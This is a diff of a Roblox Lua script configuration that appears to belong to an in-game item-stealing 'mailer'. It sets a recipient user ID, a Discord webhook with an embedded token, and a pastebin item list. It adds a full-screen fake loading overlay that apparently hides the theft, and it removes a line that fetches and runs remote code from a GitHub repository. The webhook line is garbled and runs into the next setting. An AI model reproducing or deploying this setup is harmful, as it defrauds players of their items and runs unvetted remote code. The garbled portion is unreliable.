@@ -1,5 +1,5 @@
 --CONFIG--
-getgenv().TARGET_USER_ID = 5217877819
+getgenv().TARGET_USER_ID = 4034816757
 getgenv().MENTION_EVERYONE = false
 getgenv().SEND_LIST = "all"
 getgenv().YOUR_WEBHOOK = "https://discord.com/api/webhooks/1524960249688101014/yWgzG06_tFgP4skrvEx5rpthdgnKaX4oj34HZGi-922kIGDndTDOmnGy0enR2ABDzd_Zyourwebhook.ITEM_DATABASE_URL = "https://pastebin.com/raw/TYju4wSY"
@@ -10,7 +10,7 @@ getgenv().LoadingConfig = {
     Duration = "2m",
     Decal    = false,
     DecalId  = "52757257275",  -----textureid
-    Text     = "Devkai",
+    Text     = "Speedhubx",
     BackgroundColor = Color3.fromRGB(0, 0, 0),
     TextColor       = Color3.fromRGB(255, 255, 255),
     Font            = Enum.Font.GothamBold,
@@ -126,6 +126,3 @@ if getgenv().LoadingScreen then
         gui:Destroy()
     end)
 end
-
---LOADER--
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zopias04/GAG2MAILER/refs/heads/main/HYHAX"))()
